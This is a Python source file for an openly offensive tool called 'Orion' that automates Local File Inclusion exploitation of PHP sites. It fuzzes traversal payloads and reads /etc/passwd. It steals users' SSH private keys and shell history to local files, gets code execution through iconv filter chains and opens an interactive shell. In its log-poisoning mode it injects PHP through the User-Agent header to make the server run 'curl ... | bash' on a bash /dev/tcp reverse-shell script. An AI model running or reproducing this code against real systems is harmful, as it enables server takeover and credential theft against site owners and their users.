from imports import *
from state_color import *
from lfi_service_dettector import *
import time

file_to_use = "php://temp"
TIMEOUT_VALUE = 20
session = requests.Session()
Size_Responses = []
VAILD_FILE_NAME = ""
web_root = "/var/www/html"
Base_URL = ""
Service_Dettector_Mode = False


banner = r"""

________        .__
\_____  \_______|__| ____   ____
 /   |   \_  __ \  |/  _ \ /    \
/    |    \  | \/  (  <_> )   |  \
\_______  /__|  |__|\____/|___|  /
        \/                     \/

            ╦   ╔═╗ ╦
            ║   ╠╣  ║
            ╩═╝ ╚   ╩
Local File Inclusion Auomation - Tools
"""

print(banner)





def send_request(url, headers=None):
    try:
        return session.get(
            url=url,
            headers=headers or {},
            timeout=10
        )
    except Exception as e:
        print(f" {ERROR} --> {e}")
        return None


def calc_response_size(response):
    if response and response.text:
        return len(response.text.strip())
    return 0


def normal_state(url, vaild_file):
    test_cases = set()

    test_cases.add(url)
    test_cases.add(url.split('?')[0])
    test_cases.add(url + "NotVaildFile")

    if vaild_file:
        test_cases.add(url + vaild_file)

    for test_url in test_cases:
        res = send_request(test_url)
        print(test_url)

        if not res:
            continue

        size = calc_response_size(res)
        Size_Responses.append(size)


def response_size_compare(response):
    content_length = len(response.text.strip())
    if content_length not in Size_Responses:
        return True
    else:
        return False



def check_access_log(payload=""):
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access_log",
        "/var/log/apache/access.log"
    ]
    print(LINE)
    print(f"\n\t{BOLD}Checking Access To Apache/HTTPD Logs{RESET}\n")
    found = False
    if payload:

        for path in log_paths:
            access_log_payload = payload.replace("/etc/passwd", path)
            try:
                res = send_request(access_log_payload)
                content = res.text.strip()
                if "HTTP/" in content and "etc/passwd" in content:
                    print(f" {SUCCESS} Logs is Accessible at: '{path}'")
                    print(f" {PAYLOADC} -> '{access_log_payload}'")
                    print(f" {WARN} Log Poisoning! : Use Log_Poioning Mode: python3 LFIScan.py -lh <IP> -lp <Listen-Port> -logp {access_log_payload} ")
                    print(LINE)
                    found = True
                    break
            except Exception:
                continue
        if not found:
            print(f" {ERROR} Failed to Access access.log (File not found or Permission Denied)\n")
            print(LINE)
    else:
        for path in log_paths:
            for payload in Payloads:
                payload = payload.replace("/etc/passwd",path)
                payload = Base_URL + payload

                try:
                    res = send_request(payload)
                    content = res.text.strip()
                    if "HTTP/" in content and "etc/passwd" in content:
                        print(f" {SUCCESS} Logs is Accessible at: '{path}'")
                        print(f" {PAYLOADC} -> '{payload}'")
                        print(f" {WARN} Log Poisoning! : Use Log_Poioning Mode: python3 LFIScan.py -lh <IP> -lp <Listen-Port> -logp {payload}")
                        print(LINE)
                        found = True
                        break
                except Exception:
                    continue
        if not found:
            print(f" {ERROR} Failed to Access access.log (File not found or Permission Denied)\n")
            print(LINE)



def Testing_passwd_file(payload):
    res = send_request(payload)
    if not res:
        return False
    response_content = res.text.strip()
    if "root:" in response_content:
        print(f" {SUCCESS} /etc/passwd Is Accessable")
        print(f" {PAYLOADC}'{payload}'")
        Test_LFI(payload)
        return True
    return False



def Test_LFI(payload):
    users = Extract_Real_Users(payload)

    check_access_log(payload)
    Extract_hostname(payload)
    if users:
        Extract_user_ssh_keys(payload, users)
        Extract_history_files(payload, users)

    test_rfi()
    testing_rce()


def Extract_history_files(payload,users):
    history_files = [".bash_history", ".zsh_history"]
    if not users:
        print(f"{ERROR} No users found, skipping history extraction")
        return

    print(LINE)
    print(f"\n\t{BOLD}Extracting User's History Files{RESET}\n")

    found_any = False

    for user in users:
        for history_file in history_files:
            history_payload = payload.replace(
                "etc/passwd",
                f"home/{user}/{history_file}"
            )

            res = send_request(history_payload)
            if not res:
                continue

            is_different = response_size_compare(res)


            if res.status_code == 200 and is_different:
                print(f" {INFO} There is Different of Response Size for User '{user}'")
                print(f" {PAYLOADC} -> '{history_payload}'")
                found_any = True

    if not found_any:
        print(f" {ERROR} Access Denied | History Files Not Found")

    print(LINE)



def get_index_url():
    parsed = urlparse(Base_URL)

    directory = posixpath.dirname(parsed.path)
    index_path = posixpath.join(directory, "index.php")

    full_url = f"{parsed.scheme}://{parsed.netloc}{index_path}"
    res = send_request(full_url)

    if not res:
        return False

    return res.status_code == 200



import re
import base64

def is_base64(s):
    try:
        return base64.b64encode(base64.b64decode(s)) == s.encode()
    except:
        return False


def extract_base64_candidates(text):
    pattern = r'\b(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?\b'
    return re.findall(pattern, text)


def testing_base64_encode_filter():
    print(LINE)
    print(f"\n\t{BOLD}Testing base64 filter LFI{RESET}\n")

    targets = set()

    # index.php check
    if get_index_url():
        targets.add("index.php")


    # user provided file
    if VAILD_FILE_NAME:
        targets.add(VAILD_FILE_NAME)

    # extract from URL
    current_page_name = Base_URL.split("/")[-1].split("?")[0]
    if current_page_name:
        targets.add(current_page_name)

        # remove extension
        base_name = current_page_name.split('.')[0]
        targets.add(base_name)

    # smart extensions
    final_targets = set()
    for t in targets:
        final_targets.add(t)
        final_targets.add(f"{t}.php")
        final_targets.add(f"{t}.txt")
        final_targets.add(f"{t}.bak")

    for file in final_targets:

        payload = f"{Base_URL}php://filter/convert.base64-encode/resource={file}"

        try:
            res = send_request(payload)
            clean_response = re.sub(r"<.*?>", "", res.text)

            candidates = extract_base64_candidates(clean_response)

            for candidate in candidates:

                if len(candidate) < 10:
                    continue

                if not is_base64(candidate):
                    continue

                try:
                    decoded = base64.b64decode(candidate).decode("utf-8", errors="ignore")

                    # 🔥 detection logic
                    if "<?php" in decoded or len(decoded.strip()) > 100:

                        print(f" {SUCCESS} LFI confirmed via base64 filter!")
                        print(f" {PAYLOADC} -> {payload}")

                        filename = f"decoded_{file.replace('/', '_')}"
                        with open(filename, "w") as f:
                            f.write(decoded)

                        print(f" {WARN} saved decoded file -> {filename}")

                        # hint
                        if "<?php" not in decoded:
                            print(f" {INFO} Non-PHP file leaked (interesting data)")

                        return True

                except:
                    continue

        except:
            continue

    print(f" {ERROR} Base64 filter LFI not detected")
    return False









def Extract_hostname(payload=""):
    print(LINE)
    print(f"\n\t{BOLD}Extracting Hostname{RESET}\n")

    if payload:
        hostname_payload = payload.replace("passwd", "hostname")
        res = send_request(hostname_payload)
        if not res:
            print(f"{ERROR} Request Failed")
            return
        content = res.text.strip()
        if res.status_code == 200:
            print(f" {SUCCESS} Hostname Found")
            print(f" {PAYLOADC} -> '{hostname_payload}'")
        else:
            print(f"{ERROR} Failed to extract hostname")

        print(LINE)
        return

    for p in Payloads:
        hostname_payload = Base_URL + p.replace("passwd", "hostname")

        res = send_request(hostname_payload)
        if not res:
            continue

        content = res.text.strip()
        is_different = response_size_compare(res)

        if res.status_code == 200 and is_different:
            print(f" {SUCCESS} Hostname Found")
            print(f" {PAYLOADC} -> '{hostname_payload}'")
            print(f" {INFO} Response:\n{content}")
            break

    print(LINE)


# Extract users SSH Keys

def Extract_user_ssh_keys(payload, users):
    ssh_files = [
        ".ssh/id_rsa",
        ".ssh/id_ed25519",
        ".ssh/id_ecdsa",
        ".ssh/id_dsa",
        ".ssh/authorized_keys"
    ]

    if not users:
        return

    print(LINE)
    print(f"\n\t{BOLD}Enumeration User's SSH Keys{RESET}\n")

    found_any_key = False

    for user in users:
        print(f" - Checking user: {CYAN}{user}{RESET}")

        for ssh_file in ssh_files:
            base_path = f"root/{ssh_file}" if user == "root" else f"home/{user}/{ssh_file}"
            ssh_key_payload = payload.replace("etc/passwd", base_path)

            try:
                res = send_request(ssh_key_payload)
                if not res:
                    continue

                content = res.text

                # quick validation
                if res.status_code != 200:
                    continue

                if any(error in content.lower() for error in ERROR_INDICATORS):
                    continue

                if not ("-----BEGIN" in content or "ssh-" in content):
                    continue

                # clean html
                clean_content = re.sub(r'<[^>]+>', '', content).strip()

                # extract key
                if "-----BEGIN" in clean_content:
                    start = clean_content.find("-----BEGIN")
                    end = clean_content.find("-----END")

                    if end != -1:
                        end_line = clean_content[end:].splitlines()[0]
                        final_key = clean_content[start: clean_content.find(end_line) + len(end_line)]
                    else:
                        final_key = clean_content[start:]
                else:
                    lines = clean_content.splitlines()
                    final_key = "\n".join([l for l in lines if l.startswith("ssh-")])

                if not final_key:
                    continue

                file_type = "Private_Key" if "-----BEGIN" in final_key else "Public_Key"

                print(f" {SUCCESS} File '{file_type}' Found for User: {CYAN}{user}{RESET}")
                print(f" {PAYLOADC} -> '{ssh_key_payload}'")

                filename = f"ssh_{user}_{ssh_file.split('/')[-1]}.txt"
                with open(filename, "w") as f:
                    f.write(final_key.strip())

                print(f" {WARN} Saved -> {filename}")

                found_any_key = True

            except Exception:
                continue

    if not found_any_key:
        print(f"\n{ERROR} Access Denied | SSH Keys Not Found\n")

    print(LINE)


# Extract User Part

def fetch_payload(payload):
    return send_request(payload)

def parse_users(text):
    clean_text = re.sub(r'<[^>]+>', '', text)
    lines = [line.strip() for line in clean_text.split('\n') if line.strip()]
    user_pattern = r"^([^:]+):.*(/bin/bash|/bin/sh|/bin/zsh|/sh|/bash)$"
    return [re.search(user_pattern, line).group(1) for line in lines if re.search(user_pattern, line)]

def display_users(users_list, payload):
    print(LINE)
    if not users_list:
        print("None User Found")
    else:
        print(f"\n {SUCCESS} Found Users : {len(users_list)} ")
        print(f" {PAYLOADC}'{payload}'")
        for user in users_list:
            print(f" . {CYAN}{user}{RESET}")



def Extract_Real_Users(payload):
    res = fetch_payload(payload)
    if not res:
        print(f"{ERROR} Failed request")
        return

    users_list = parse_users(res.text)
    display_users(users_list, payload)
    return users_list






def test_rfi():
    print(LINE)
    print(f"\n\t{BOLD}Testing for RFI (Remote File Inclusion){RESET}\n")

    test_url = "https://www.google.com/robots.txt"
    payload = Base_URL + test_url

    res = send_request(payload)
    if not res:
        print(f" {ERROR} Failed To Send Request")
        return

    content = res.text.lower()

    is_valid = (
        res.status_code == 200 and
        "user-agent: *" in content and
        not any(error in content for error in ERROR_INDICATORS)
    )

    if is_valid:
        print(f" {SUCCESS} RFI Vulnerability Confirmed! External URLs Allowed")
        print(f" {PAYLOADC} -> '{payload}'")
        print(f" {INFO} Server is fetching remote resources.")
        print(LINE)
    else:
        print(f" {ERROR} RFI Seems to be Disabled")




def testing_rce():
    print(f"\n\t{BOLD}Testing for RCE via iconv filter{RESET}\n")
    checking_rce_payload = f"{Base_URL}{iconv_filter_exexute_id}"
    res = send_request(checking_rce_payload)
    print(res)
    if "uid" in res.text.strip():
        print(f" {SUCCESS} - RCE Found")
        print(f" ID -> {res.text.strip()}")
        print(LINE)
        open_shell()
    else:
        print(f" {ERROR} Failed Execute Commands Via ICONV Filter\n")
        print(LINE)

def open_shell():
    print("\n" + "="*50)
    print(f" {BGREEN}>>> Interactive PHP Filter Chain Shell <<< {RESET}")
    print(" (type 'exit' to quit | Ctrl+C to stop)")
    print("="*50)
    try:
        while True:
            shell_command = input("Shell> ").strip()
            if not shell_command: continue
            if shell_command.lower() in ['exit', 'quit']: break
            php_command = r"<?php system('cmd');\n ?>"
            php_command = php_command.replace('cmd', shell_command)
            chain = php_command.encode('utf-8')
            base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
            ready_payload = generate_filter_chain(base64_value)
            Exexute_hacker_command(ready_payload)
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted.")
    except Exception as e:
        print(f"\n[!] Error: {e}")

def generate_filter_chain(chain, debug_base64 = False):
    encoded_chain = chain
    filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        filters += "convert.base64-decode"
    return f"php://filter/{filters}/resource={file_to_use}"

def Exexute_hacker_command(command):
    rce_command_payload = f"{Base_URL}{command}"
    res = send_request(rce_command_payload)
    print(LINE)
    print(res.text.strip())
    print(LINE)

def generate_custom_lfi_payload(url,exsist_file):
    target_file="etc/passwd"
    parsed_url = urlparse(url)
    traversal = "../" * 5
    double_traversal = "....//" * 5
    Payloads.append(f"{web_root}/{traversal}{target_file}")
    Payloads.append(f"{web_root}/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"/{double_traversal}{target_file}")
    Payloads.append(f"{exsist_file}/{traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}/{target_file}")
    Payloads.append(f"{exsist_file}/{double_traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{traversal}{target_file}")
    Payloads.append(f"php://filter/convert.base64-encode/resource={exsist_file}/{double_traversal}{target_file}")




def parse_cookies(cookie_string):
    cookies = {}
    if cookie_string:
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    return cookies

def take_args():
    global Base_URL, VAILD_FILE_NAME, TIMEOUT_VALUE
    parser = argparse.ArgumentParser(description="Recon + Payloa1d Fuzzer")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("--proxy", help="Proxy (example: http://127.0.0.1:8080)")
    parser.add_argument("-c", "--cookie", help="Cookie header")
    parser.add_argument("-f", "--file",help="Please Enter Exsists and Valid File")
    parser.add_argument("-s","--service",action="store_true", help="Service Dettector Mode")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("-p", "--port",type=int, help="The Port of Knwon Service")
    parser.add_argument("-t", "--threads",type=int,default=10, help="Threads Count used to Find the Knwon Service")
    parser.add_argument("-lh","--lhost",help="IP Address of Your Host")
    parser.add_argument("-lp","--lport",help="Your Listineng Port")
    parser.add_argument("-logp","--logpayload",help="The Working Payload to Access Log")


    args = parser.parse_args()
    TIMEOUT_VALUE = args.timeout
    if args.proxy:
        proxy_url = args.proxy.strip()

        if not proxy_url.startswith("http"):
            proxy_url = "http://" + proxy_url

        proxy = {
            "http": proxy_url,
            "https": proxy_url
        }

        session.proxies.update(proxy)
        session.verify = False  # disable SSL verification (Burp)
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        print(f"{INFO} Proxy Enabled -> {proxy_url}")


    global Threads,PORT,Service_Dettector_Mode
    if args.cookie:
        session_cookies = parse_cookies(args.cookie)
        session.cookies.update(session_cookies)

    if args.logpayload and args.lhost and args.lport:
        print(LINE)
        print(f"\n {BGREEN}>>> Log Poisoning Mode <<< {RESET}")
        log_poisoning(args.lhost,args.lport,args.logpayload)

    if args.file:
        VAILD_FILE_NAME = args.file
        generate_custom_lfi_payload(Base_URL,VAILD_FILE_NAME)
    if args.url:
        Base_URL = args.url
    if args.service and args.port:
        Service_Dettector_Mode = True
        PORT = args.port
        Threads = args.threads



# This is Log Poisoning Part

def confirm_log_poisoning(payload):
    check_log_poisoning_header = {
        "User-Agent" : "<?php $v='7715'; echo 'Orion'.$v;?>"
    }
    url = payload.split('?')[0]
    try:
        res = send_request(url,check_log_poisoning_header)
        res = send_request(payload)
        if "Orion7715" in res.text:
            return True
        else:
            return False
    except Exception as e:
        print(f"{ERROR} Error --> {e}")




def log_poisoning(host,port,payload):
    success = confirm_log_poisoning(payload)
    if not success:
        print(f" {WARN} Access log File Dos'nt Execute PHP, Check it Manually")
        print(LINE)
        sys.exit(1)
        
    print(f" {SUCCESS} Access log File Executing PHP")       
    print(f" {INFO} In Other Terminal Run : nc -lvnp {port}")
    print(f" {INFO} In Other Terminal Run : python3 -m http.server 9165 -d /tmp")
    os.system(f"echo '#!/bin/bash' > /tmp/shell.sh;echo 'bash -i >& /dev/tcp/{host}/{port} 0>&1' >> /tmp/shell.sh;chmod +x /tmp/shell.sh")
    ready = input("Done [yes/any]: ")
    if ready.lower() == "yes":
        log_poisoning_header = {
            "User-Agent":f"<?php system('curl http://{host}:9165/shell.sh | bash'); ?>"
        }
        try:
            url = payload.split('?')[0]
            res = send_request(url,log_poisoning_header)
            time.sleep(10)
            res = send_request(payload)
            if res == None:
                print(f" {INFO} Check Your Listener")
                sys.exit(1)
        except Exception as e:
            print("Execute Exexption")
            print(f" {INFO} Check Your Listener")
            print(f"\n {ERROR} Error --> {e}")
            sys.exit(1)
    else:
        print("Ok, Do It Manually ^-^ ")
        sys.exit(1)
    print(f" {INFO} Check Your Listener")
    sys.exit(1)



if __name__ == "__main__":
    take_args()
    if Service_Dettector_Mode:
        print(f"\n{BOLD}>>> Service Detection Mode Enabled <<<{RESET}\n")
        if "etc/passwd" not in Base_URL:
            print(f"{ERROR} You must provide a valid LFI payload containing 'etc/passwd'")
            exit(1)
        start_service_dettect(Base_URL, PORT, Threads)
        exit(0)


    normal_state(Base_URL,VAILD_FILE_NAME)
    testing_base64_encode_filter()
    print(LINE)
    print(f"\n\t{BOLD}Extract Users From /etc/passwd{RESET}\n")
    success = False
    for payload in Payloads:
        encoded_payload = urllib.parse.quote(payload, safe="/%")
        full_url = Base_URL + encoded_payload
        if Testing_passwd_file(full_url):
            success = True
            break

    if not success:
        print(f" {ERROR} Failed to Access /etc/passwd Permission Denied | WAF | Filters\n")
        Extract_hostname()
        check_access_log()
        testing_rce()

